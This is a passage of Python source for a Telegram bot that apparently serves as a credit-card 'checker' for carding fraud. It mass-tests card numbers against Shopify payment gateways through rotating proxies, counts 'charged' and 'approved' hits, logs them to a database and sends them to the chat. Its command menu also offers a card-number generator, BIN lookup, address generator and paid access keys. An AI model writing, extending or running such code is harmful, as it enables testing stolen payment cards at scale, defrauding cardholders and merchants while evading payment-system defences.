    if source_proxies:
        preflight_msg = await msg.answer(f"{pe('refresh')} <b>{sc('Preflight')}</b> — {sc('validating proxies')}...", parse_mode="HTML")
        pf = await preflight_proxies(uid, source_proxies); live_proxies = pf["live"]
        try: await preflight_msg.delete()
        except: pass
    task_id, cancel_ev = uuid.uuid4().hex[:8], asyncio.Event()
    _mass_tasks[task_id] = cancel_ev
    results, counts = {}, {"charged": 0, "approved": 0, "approved_nsf": 0, "approved_ccn": 0, "approved_3ds": 0, "captcha": 0, "declined": 0, "site_error": 0, "proxy_error": 0, "error": 0, "timeout": 0, "rate_limited": 0, "retried": 0, "retry_hit": 0}
    start_time, completed, hits_count, dropped_proxies = time.time(), 0, 0, []
    bot_conc = (MASS_CONCURRENCY_LB_ADMIN if (bypass_quota or is_admin(uid)) else MASS_CONCURRENCY_LB_PREMIUM)
    batch_size, batch_delay = (MASS_BATCH_SIZE_LB, MASS_BATCH_DELAY_LB)
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Cancel"), icon="stop", color="danger", callback_data=f"mc:cancel:{task_id}")]])
    
    def render(batch_num, batch_total, batch_done, batch_size_, phase="active"):
        pct, bar, fancy, elapsed = (int(100 * completed / total) if total else 0), make_bar(int(100 * completed / total) if total else 0, width=14), make_fancy_bar(int(100 * completed / total) if total else 0), time.time() - start_time
        speed, eta = (completed / elapsed if elapsed > 0 else 0), ((total - completed) / (completed / elapsed) if elapsed > 0 and completed > 0 else 0)
        lines = [f"{pe('loading')} <b>{sc('Mass Checking')}</b> · {completed}/{total} · <b>{pct}%</b>", f"<code>{bar}</code>", f"{fancy}", f"<blockquote>{pe('check')} {sc('Hits')}: <b>{hits_count}</b> · {pe('cross2')} {sc('Declined')}: <b>{counts['declined']}</b></blockquote>", f"<blockquote>{pe('hourglass')} {sc('ETA')}: <b>{_fmt_eta(eta)}</b> · {pe('percent')} <b>{speed:.1f} cc/s</b></blockquote>"]
        return "\n".join(lines)
        
    async def do_check(cc, proxy):
        try: return await call_api(cc, proxy=proxy, uid=uid, mode=mode, single=False)
        except Exception as e: return {"cls": "error", "response": _sanitize_err(str(e)), "_site": "", "_proxy": proxy, "_dropped": False, "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
        
    async def handle_result(cc, res, is_retry=False):
        nonlocal completed, hits_count
        cls, site_, prx_, resp_, gw_, ts_ = res.get("cls", "error"), res.get("_site", ""), res.get("_proxy"), _sanitize_err(res.get("response", "")), res.get("gateway", "Shopify"), datetime.now(timezone.utc).isoformat()
        if res.get("_dropped") and prx_ and prx_ not in dropped_proxies: dropped_proxies.append(prx_)
        if cls in RETRYABLE_CLS:
            results[cc] = ("ERROR", resp_[:35]); counts["error"] += 1; completed += 1; return
        if is_hit(cls):
            results[cc], counts[cls] = (cls.upper(), resp_[:35]), counts.get(cls, 0) + 1
            hits_count += 1
            asyncio.create_task(send_chat_hit(bot, msg.chat.id, cc, res, site_))
            try:
                async with _get_write_lock():
                    with db() as c: c.execute("INSERT INTO check_logs(uid,cc,response,status,gateway,ts) VALUES(?,?,?,?,?,?)", (uid, cc, resp_, "HIT", gw_, ts_)); c.execute("UPDATE users SET total_hits=total_hits+1 WHERE uid=?", (uid,))
            except: pass
            try: await record_charged(cc, res, site_, uid)
            except Exception as e: log.error(f"mass_check record_charged: {e}")
        else:
            results[cc], counts["declined"] = ("DECLINED", resp_[:35]), counts["declined"] + 1
            try:
                async with _get_write_lock():
                    with db() as c: c.execute("INSERT INTO check_logs(uid,cc,response,status,gateway,ts) VALUES(?,?,?,?,?,?)", (uid, cc, resp_, "DECLINED", gw_, ts_))
            except: pass
        completed += 1
        
    batches, total_batches = [normalized[i:i + batch_size] for i in range(0, total, batch_size)], max(1, (total + batch_size - 1) // batch_size)
    progress = await msg.answer(render(1, total_batches, 0, len(batches[0]) if batches else 0), parse_mode="HTML", reply_markup=cancel_kb)
    for b_idx, batch in enumerate(batches, start=1):
        if cancel_ev.is_set(): break
        bot_sem = asyncio.Semaphore(bot_conc)
        async def active_one(cc):
            if cancel_ev.is_set(): return
            async with bot_sem:
                if cancel_ev.is_set(): return
                await handle_result(cc, await do_check(cc, rotate_proxy(uid, live_proxies) if live_proxies else None), is_retry=False)
        tasks = [asyncio.create_task(active_one(c)) for c in batch]
        for fut in asyncio.as_completed(tasks):
            try: await fut
            except: pass
            if cancel_ev.is_set():
                for t in tasks:
                    if not t.done(): t.cancel()
                break
            try: await progress.edit_text(render(b_idx, total_batches, 0, len(batch), "active"), parse_mode="HTML", reply_markup=cancel_kb)
            except: pass
        if cancel_ev.is_set(): break
        if b_idx < total_batches and not cancel_ev.is_set():
            try: await asyncio.wait_for(cancel_ev.wait(), timeout=batch_delay)
            except asyncio.TimeoutError: pass
    _mass_tasks.pop(task_id, None)
    elapsed = time.time() - start_time
    final = f"{pe('check')} <b>{sc('Mass Complete')}</b>\n<blockquote>{pe('shop')} {sc('Total')}: <b>{total}</b>\n{pe('check')} {sc('Hits')}: <b>{hits_count}</b>\n{pe('cross2')} {sc('Declined')}: <b>{counts['declined']}</b>\n{pe('hourglass')} {sc('Time')}: <b>{elapsed:.1f}s</b></blockquote>"
    try: await progress.edit_text(final, parse_mode="HTML", reply_markup=None)
    except: pass

async def error_handler(event, exception=None, **kwargs):
    if exception is None: exception = kwargs.get("error", Exception("unknown"))
    if any(x in type(exception).__name__ for x in ("Disconnect", "Timeout", "ConnectionError", "ClientOSError")): return True
    err_msg = str(exception).lower()
    if any(x in err_msg for x in ("not modified", "query is too old", "query id is invalid", "message to edit not found", "message can't be edited", "no text in the message", "chat not found", "bot was blocked", "user is deactivated", "too many requests")): return True
    log.exception(f"Unhandled {type(exception).__name__}: {exception}")
    return True

async def start_health_server(port: int) -> None:
    from aiohttp import web
    app = web.Application()
    app.router.add_get("/", lambda _: web.Response(text="ok"))
    app.router.add_get("/health", lambda _: web.Response(text="ok"))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", port).start()
    log.info(f"health server on :{port}")

async def main():
    global _bot_ref, _db_write_lock, BOT_USERNAME
    if not BOT_TOKEN: raise SystemExit("BOT_TOKEN env var missing")
    _db_write_lock = _get_write_lock(); init_db(); load_extra_admins(); load_api_state(); load_sites()

    bot = Bot(token=BOT_TOKEN, session=AiohttpSession(proxy=TELEGRAM_PROXY) if TELEGRAM_PROXY else None, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    _bot_ref = bot; BOT_USERNAME = (await bot.get_me()).username

    dp = Dispatcher(); dp.update.outer_middleware(EnsureUserMiddleware()); dp.include_router(router); dp.errors.register(error_handler)
    await bot.delete_webhook(drop_pending_updates=True)
    try:
        await bot.set_my_commands([BotCommand(command="start", description="Main Menu"), BotCommand(command="cmd", description="All Commands"), BotCommand(command="sh", description="Shopify Checker"), BotCommand(command="msh", description="Mass Shopify"), BotCommand(command="auth", description="Auth Checker"), BotCommand(command="mauth", description="Mass Auth"), BotCommand(command="redeem", description="Redeem Key"), BotCommand(command="bin", description="BIN Lookup"), BotCommand(command="gen", description="CC Generator"), BotCommand(command="format", description="CC Formatter"), BotCommand(command="addr", description="Address Gen"), BotCommand(command="chk", description="Proxy Checker"), BotCommand(command="fb", description="Send Feedback"), BotCommand(command="iadmin", description="Message Admin"), BotCommand(command="top", description="Top Checkers")])
    except: pass

    asyncio.create_task(auto_backup_task())
    asyncio.create_task(_scrapper_loop())
    if PORT:
        try: await start_health_server(int(PORT))
        except Exception as e: log.warning(f"health server failed: {e}")

    log.info(f"bot starting | apis={len(load_api_state()['endpoints'])} sites={len(get_sites())} mode={mode_label()}")
    try: await dp.start_polling(bot)
    finally: pass

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: pass